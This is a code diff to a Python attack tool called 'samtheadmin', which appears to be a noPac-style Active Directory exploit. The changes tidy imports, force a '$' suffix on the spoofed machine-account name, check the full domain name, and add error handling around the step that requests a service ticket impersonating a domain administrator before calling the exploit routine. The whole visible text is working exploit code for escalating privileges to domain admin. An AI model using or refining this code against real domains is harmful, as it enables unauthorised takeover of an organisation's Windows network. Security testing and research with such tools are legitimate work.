@@ -14,13 +14,9 @@ import logging
 import sys
 import string
 import random
-import ssl
 import os
-from binascii import unhexlify
-from ldap3.utils.log import log
 import ldapdomaindump
 import ldap3
-import time
 
 from utils.helper import *
 from utils.addcomputer import AddComputerSAMR
@@ -80,6 +76,9 @@ def samtheadmin(username, password, domain, options):
     else:
         new_computer_name = 'WIN-'+''.join(random.sample(string.ascii_letters + string.digits, 11)).upper()
 
+    if new_computer_name[-1] != '$':
+        new_computer_name += '$'
+
     if options.old_hash:
         if ":" not in options.old_hash:
             logging.error("Hash format error.")
@@ -98,6 +97,10 @@ def samtheadmin(username, password, domain, options):
     cnf = ldapdomaindump.domainDumpConfig()
     cnf.basepath = None
     domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)
+    check_domain = ".".join(domain_dumper.getRoot().replace("DC=","").split(","))
+    if domain != check_domain:
+        logging.error("Pls use full domain name, such as: domain.com/username")
+        return
     MachineAccountQuota = 10
     # check MAQ and options
     for i in domain_dumper.getDomainPolicy():
@@ -238,17 +241,23 @@ def samtheadmin(username, password, domain, options):
         logging.error('Cannot restore the old name lol')
 
     os.environ["KRB5CCNAME"] = dcticket
-    executer = GETST(None, None, domain, options,
-        impersonate_target=domain_admin,
-        target_spn=f"cifs/{dcfull}")
-    executer.run()
-    logging.info(f'Remove ccache of {dcfull}')
-    os.remove(dcticket)
+    try:
+        executer = GETST(None, None, domain, options,
+            impersonate_target=domain_admin,
+            target_spn=f"cifs/{dcfull}")
+        executer.run()
+        logging.info(f'Remove ccache of {dcfull}')
+        os.remove(dcticket)
+    except Exception as e:
+        logging.error(f"GetST error, error: {e}")
+        return
+
     logging.info(f'Rename ccache with target ...')
     os.rename(f'{domain_admin}.ccache',adminticket)
     # Delete domain computer we just added.
     if not options.no_add:
         del_added_computer(ldap_session, domain_dumper,new_computer_name)
+
     exploit(dcfull,adminticket,options)
 
 
